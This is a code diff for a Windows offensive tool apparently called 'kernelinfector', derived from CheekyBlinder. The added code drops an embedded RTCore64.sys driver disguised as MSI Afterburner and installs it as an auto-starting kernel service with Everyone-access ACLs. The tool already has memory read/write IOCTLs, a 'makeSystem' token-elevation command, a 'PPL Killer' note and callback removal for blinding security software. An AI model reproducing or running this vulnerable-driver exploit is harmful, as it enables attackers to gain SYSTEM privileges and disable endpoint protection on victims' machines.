@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -43,13 +44,28 @@ type SECURITY_ATTRIBUTES struct {
 //sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (ret bool) = kernel32.DeviceIoControl
 //sys CreateFile(lpFileName string, dwDesiredAccess uint32, dwShareMode uint32, lpSecurityAttributes *SECURITY_ATTRIBUTES, dwCreationDisposition uint32, dwFlagsAndAttributes uint32, hTemplateFile uintptr) (handle uintptr, err error) = kernel32.CreateFile
 //sys CloseHandle(hObject HANDLE) (ret bool) = kernel32.CloseHandle
-//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret int,err error) = advapi32.RegGetValueW
+//sys GetLastError() (ret uint32 ) = kernel32.GetLastError
+//sys RegGetValueW(hkey int,lpSubKey string, lpValue string, dwFlags uint32, pdwType *uint32, pvData uintptr, pcbData *uint32) (ret uint32, err error) = advapi32.RegGetValueW
+//sys OpenSCManagerW(lpMachineName string, lpDatabaseName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenSCManagerW
+//sys OpenServiceW(hSCManager uintptr, lpServiceName string, dwDesiredAccess uint32) (handle uintptr, err error) = advapi32.OpenServiceW
+//sys CreateServiceW(hSCManager uintptr, lpServiceName string, lpDisplayName string, dwDesiredAccess uint32, dwServiceType uint32, dwStartType uint32, dwErrorControl uint32, lpBinaryPathName string, lpLoadOrderGroup string, lpdwTagId string, lpDependencies string, lpServiceStartName string, lpPassword string) (handle uintptr, err error) = advapi32.CreateServiceW
+//sys DeleteService(hService uintptr) (ret bool) = advapi32.DeleteService
+//sys StartServiceW(hService uintptr, dwNumServiceArgs uint32, lpServiceArgVectors *int16) (ret bool) = advapi32.StartServiceW
+//sys CloseServiceHandle(hSCObject uintptr) (ret bool) = advapi32.CloseServiceHandle
 
-//OpenSCManager
-//OpenService
-//CreateService
-//StartService
-//CloseServiceHandle
+//sys QueryServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr, cbBufSize uint32, pcbBytesNeeded *uint32) (ret bool) = advapi32.QueryServiceObjectSecurity
+//sys BuildSecurityDescriptorW(pOwner unsafe.Pointer, pGroup unsafe.Pointer, cCountOfAccessEntries int64, pListOfAccessEntries *windows.EXPLICIT_ACCESS, cCountOfAuditEntries int64, pListOfAuditEntries *windows.EXPLICIT_ACCESS, pOldSD unsafe.Pointer, pSizeNewSD uint32, pNewSD *uintptr) (ret uint32) = advapi32.BuildSecurityDescriptorW
+//sys SetServiceObjectSecurity(hService uintptr, dwSecurityInformation uint32, lpSecurityDescriptor uintptr) (ret bool) = advapi32.SetServiceObjectSecurity
+//sys LocalFree(hMem uintptr) (ret bool) = advapi32.LocalFree
+//sys SetEntriesInAclW(cCountOfExplicitEntries uint32, pListOfExplicitEntries *windows.EXPLICIT_ACCESS, OldAcl *windows.ACL, NewAcl **windows.ACL) (ret uint32) = advapi32.SetEntriesInAclW
+
+// windows.ControlService()
+// windows.CloseServiceHandle()
+// windows.StartService()
+// windows.CreateService()
+// windows.GetLastError()
+// windows.OpenSCManager()
+// windows.LoadLibrary()
 
 /*
 from CheekyBlinder
@@ -78,10 +94,33 @@ type Rtcore64MemoryRead struct {
 }
 
 const (
-	RTCORE64_MEMORY_READ_CODE  uint32 = 0x80002048
-	RTCORE64_MEMORY_WRITE_CODE uint32 = 0x8000204c
-	INVALID_HANDLE_VALUE       HANDLE = ^HANDLE(0)
+	RTCORE64_MEMORY_READ_CODE     uint32 = 0x80002048
+	RTCORE64_MEMORY_WRITE_CODE    uint32 = 0x8000204c
+	INVALID_HANDLE_VALUE          HANDLE = ^HANDLE(0)
+	ERROR_SERVICE_DOES_NOT_EXIST  uint32 = 1060
+	ERROR_SERVICE_ALREADY_RUNNING uint32 = 1056
+	ERROR_INSUFFICIENT_BUFFER     uint32 = 122
+	ERROR_SUCCESS                 uint32 = 0
+	SERVICE_ALL_ACCESS                   = windows.SERVICE_QUERY_STATUS |
+		windows.SERVICE_QUERY_CONFIG |
+		windows.SERVICE_INTERROGATE |
+		windows.SERVICE_ENUMERATE_DEPENDENTS |
+		windows.SERVICE_PAUSE_CONTINUE |
+		windows.SERVICE_START |
+		windows.SERVICE_STOP |
+		windows.SERVICE_USER_DEFINED_CONTROL |
+		windows.READ_CONTROL
 )
+
+type SECURITY_DESCRIPTOR struct {
+	Revision byte
+	Sbz1     byte
+	Control  uint16
+	Owner    uintptr
+	Group    uintptr
+	Sacl     uintptr
+	Dacl     uintptr
+}
 
 /*
 from CheekyBlinder
@@ -100,7 +139,6 @@ func getVersionOffsets() Offsets {
 } */
 
 func RegGetString(hKey int, subKey string, value string) string {
-	var ERROR_SUCCESS = 0
 	var RRF_RT_REG_SZ uint32 = 0x00000002
 	var bufLen uint32
 	RegGetValueW(hKey, subKey, value, RRF_RT_REG_SZ, nil, 0, &bufLen)
@@ -116,6 +154,7 @@ func RegGetString(hKey int, subKey string, value string) string {
 }
 
 func getVersionOffsets() Offsets {
+	//PPL Killer
 	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
 	fmt.Printf("[+] Windows Version %s Found!\n", winver)
 	switch winver {
@@ -136,6 +175,7 @@ func getVersionOffsets() Offsets {
 		return Offsets{0, 0, 0, 0}
 	}
 	return Offsets{0, 0, 0, 0}
+
 }
 
 func getDriverHandle() HANDLE {
@@ -225,22 +265,248 @@ func findProcessCallbackRoutine(r string) {
 
 } */
 
-/*
-func serviceInstall(sname string, dname string, binPath string, stype string) {
-	hSc, err := w32.OpenSCManager("", "ServicesActive", w32.SC_MANAGER_CONNECT|w32.SC_MANAGER_CREATE_SERVICE)
+func TrusteeValueFromSID(sid *windows.SID) windows.TrusteeValue {
+	return windows.TrusteeValue(unsafe.Pointer(sid))
+}
+
+func SIDFromTrusteeValueFromSID(t *windows.TrusteeValue) *windows.SID {
+	return (*windows.SID)(unsafe.Pointer(t))
+}
+
+func serviceAddEveryoneAccess(srvName string) bool {
+	status := false
+	trustee := windows.TRUSTEE{}
+	trustee.MultipleTrustee = nil
+	trustee.MultipleTrusteeOperation = windows.NO_MULTIPLE_TRUSTEE
+	trustee.TrusteeForm = windows.TRUSTEE_IS_SID
+	trustee.TrusteeType = windows.TRUSTEE_IS_WELL_KNOWN_GROUP
+	trustee.TrusteeValue = 0
+
+	forEveryoneACL := windows.EXPLICIT_ACCESS{}
+	forEveryoneACL.AccessPermissions = SERVICE_ALL_ACCESS
+	forEveryoneACL.AccessMode = windows.SET_ACCESS
+	forEveryoneACL.Inheritance = windows.NO_INHERITANCE
+	forEveryoneACL.Trustee = trustee
+
+	oldSd, err := windows.GetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION)
+	if err != nil {
+		panic(err)
+	}
+	stringSID, err := syscall.UTF16PtrFromString("S-1-1-0")
+	if err != nil {
+		panic(err)
+	}
+	var sid *windows.SID
+	err = windows.ConvertStringSidToSid(stringSID, &sid)
+	if err != nil {
+		panic(err)
+	}
+	da, _, _ := oldSd.DACL()
+	forEveryoneACL.Trustee.TrusteeValue = TrusteeValueFromSID(sid)
+	var nacl *windows.ACL
+	SetEntriesInAclW(1, &forEveryoneACL, da, &nacl)
+	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, nacl, nil)
+	if err != nil {
+		println(err)
+		panic(err)
+	}
+	status = true
+	windows.FreeSid(sid)
+	return status
+}
+
+func serviceInstall(srvName string, dName string, bPath string, srvType uint32, startType uint32, startIt bool) uint32 {
+	var hS windows.Handle
+	//var hSc uintptr = 0
+	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
+	if err != nil {
+		panic(err)
+	}
+	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_CREATE_SERVICE)
+	if err != nil {
+		fmt.Println("OpenSCManager(create)")
+		return uint32(err.(syscall.Errno))
+	}
+	serviceName, err := syscall.UTF16PtrFromString(srvName)
+	if err != nil {
+		panic(err)
+	}
+	displayName, err := syscall.UTF16PtrFromString(dName)
+	if err != nil {
+		panic(err)
+	}
+	binPath, err := syscall.UTF16PtrFromString(bPath)
+	if err != nil {
+		panic(err)
+	}
+	hS, err = windows.OpenService(hSc, serviceName, uint32(windows.SERVICE_START))
 	if err == nil {
-		hs, err := w32.OpenService(hSc, sname, w32.SERVICE_START)
-		if err == nil {
-			fmt.Printf("[+] %s service already registered\n", sname)
+		fmt.Printf("[+] '%s' service already registered\n", srvName)
+	} else {
+		if uint32(err.(syscall.Errno)) == ERROR_SERVICE_DOES_NOT_EXIST {
+			fmt.Printf("[*] '%s' service not present\n", srvName)
+			hS, err = windows.CreateService(hSc, serviceName, displayName, windows.READ_CONTROL|windows.WRITE_DAC|windows.SERVICE_START, srvType,
+				startType, windows.SERVICE_ERROR_NORMAL, binPath, nil, nil, nil, nil, nil)
+			if err == nil {
+				fmt.Printf("[+] '%s' service successfully registered\n", srvName)
+				if serviceAddEveryoneAccess(srvName) {
+					fmt.Printf("[+] '%s' service ACL to everyone\n", srvName)
+				} else {
+					fmt.Printf("[!] '%s' ServiceAddEveryoneAccess\n", srvName)
+				}
+			} else {
+				fmt.Println("CreateService")
+			}
 		} else {
-			hS = w32. (hSC, serviceName, displayName, READ_CONTROL|WRITE_DAC|SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)
-
+			fmt.Println("OpenService")
 		}
-
 	}
 
-	//w32.OpenSCManager()
-} */
+	if uintptr(hS) != 0 {
+		if startIt {
+			err = windows.StartService(hS, 0, nil)
+			if err == nil {
+				fmt.Printf("[+] '%s' service started\n", srvName)
+			} else if uint32(err.(syscall.Errno)) == ERROR_SERVICE_ALREADY_RUNNING {
+				fmt.Printf("[*] '%s' service already started\n", srvName)
+			} else {
+				fmt.Println("StartService")
+				return uint32(err.(syscall.Errno))
+			}
+		}
+		windows.CloseServiceHandle(windows.Handle(hSc))
+	}
+	windows.CloseServiceHandle(windows.Handle(hSc))
+
+	return 0
+}
+
+func serviceGenericControl(srvName string, dwDesiredAccess uint32, dwControl uint32, ptrServiceStatus *windows.SERVICE_STATUS) (bool, error) {
+	status := false
+	var srvStatus windows.SERVICE_STATUS
+	var hS windows.Handle
+	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
+	if err != nil {
+		return status, err
+	}
+	hSc, err := windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
+	if err != nil {
+		return status, err
+	}
+	if uintptr(hSc) != 0 {
+		serviceName, err := syscall.UTF16PtrFromString(srvName)
+		if err != nil {
+			return status, err
+		}
+		hS, err = windows.OpenService(hSc, serviceName, dwDesiredAccess)
+		if err != nil {
+			return status, err
+		}
+		if uintptr(hS) != 0 {
+			err = windows.ControlService(hS, dwControl, &srvStatus)
+			if err != nil {
+				return status, err
+			}
+			windows.CloseServiceHandle(hS)
+			status = true
+		}
+		windows.CloseServiceHandle(hSc)
+	}
+	return status, nil
+}
+
+func serviceUninstall(srvName string, cnt int) bool {
+	deleted := false
+	var hSC windows.Handle
+	var hS windows.Handle
+	var srvStatus windows.SERVICE_STATUS
+	if cnt > 3 {
+		fmt.Printf("[!] Reached maximun number of attempts (3) to uninstall the service '%s'\n", srvName)
+		return false
+	}
+	status, err := serviceGenericControl(srvName, windows.SERVICE_STOP, windows.SERVICE_CONTROL_STOP, nil)
+
+	if status {
+		fmt.Printf("[+] '%s' service stopped\n", srvName)
+	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_DOES_NOT_EXIST {
+		fmt.Printf("[+] '%s' service does not exeist\n", srvName)
+		return true
+	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_NOT_ACTIVE {
+		fmt.Printf("[+] '%s' service not running\n", srvName)
+	} else if err.(syscall.Errno) == windows.ERROR_SERVICE_CANNOT_ACCEPT_CTRL {
+		fmt.Printf("[*] '%s' service cannot accept control messages at this time, waiting...\n", srvName)
+		time.Sleep(1000)
+	} else {
+		fmt.Println("ServiceUninstall")
+		time.Sleep(1000)
+		return serviceUninstall(srvName, cnt+1)
+	}
+
+	databaseName, err := syscall.UTF16PtrFromString("ServicesActive")
+	if err != nil {
+		panic(err)
+	}
+	hSC, err = windows.OpenSCManager(nil, databaseName, windows.SC_MANAGER_CONNECT)
+	if err != nil {
+		panic(err)
+	}
+	if uintptr(hSC) != 0 {
+		serviceName, err := syscall.UTF16PtrFromString(srvName)
+		if err != nil {
+			panic(err)
+		}
+		hS, err = windows.OpenService(hSC, serviceName, windows.SERVICE_QUERY_STATUS|windows.DELETE)
+		if err != nil {
+			windows.CloseServiceHandle(hSC)
+			panic(err)
+		}
+		if uintptr(hS) != 0 {
+			err = windows.QueryServiceStatus(hS, &srvStatus)
+			if err != nil {
+				println(uint32(err.(syscall.Errno)))
+				windows.CloseServiceHandle(hSC)
+				panic(err)
+			}
+			if !(srvStatus.CurrentState == windows.SERVICE_STOPPED) {
+				windows.CloseServiceHandle(hS)
+				windows.CloseServiceHandle(hSC)
+				time.Sleep(1000)
+				return serviceUninstall(srvName, cnt+1)
+			} else {
+				err = windows.DeleteService(hS)
+				if err != nil {
+					panic(err)
+				}
+				deleted = true
+				windows.CloseServiceHandle(hSC)
+			}
+		}
+		windows.CloseServiceHandle(hSC)
+	}
+	if !deleted {
+		time.Sleep(1000)
+		return serviceUninstall(srvName, cnt+1)
+	}
+	return deleted
+}
+
+func installVulnDriver() {
+	currentDir, _ := os.Getwd()
+	binPath := currentDir + "/RTCore64.sys"
+	os.WriteFile(binPath, binfile, 0777)
+	status := serviceInstall("RTCore64", "Micro-Star MSI Afterburner", binPath, windows.SERVICE_KERNEL_DRIVER, windows.SERVICE_AUTO_START, true)
+	if status == 0x05 {
+		fmt.Println("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?")
+	}
+}
+
+func uninstallVulnDriver() {
+	status := serviceUninstall("RTCore64", 0)
+	if !status {
+		fmt.Println("ServiceUninstall")
+	}
+
+}
 
 func makeSystem() {
 	cpid := DWORD64(os.Getpid())
@@ -292,8 +558,6 @@ func makeSystem() {
 
 func main() {
 	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
-	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
-	fmt.Printf("[+] Windows Version %s Found!\n", winver)
 
 	if len(os.Args) < 2 {
 		fmt.Println(usage)
@@ -304,6 +568,12 @@ func main() {
 		//findProcessCallbackRoutine(r)
 	} else if os.Args[1] == "/systemcmd" {
 		makeSystem()
+	} else if os.Args[1] == "/install" {
+		installVulnDriver()
+		//findProcessCallbackRoutine("")
+	} else if os.Args[1] == "/uninstall" {
+		uninstallVulnDriver()
+		//findProcessCallbackRoutine("")
 	} else {
 		fmt.Println(usage)
 	}
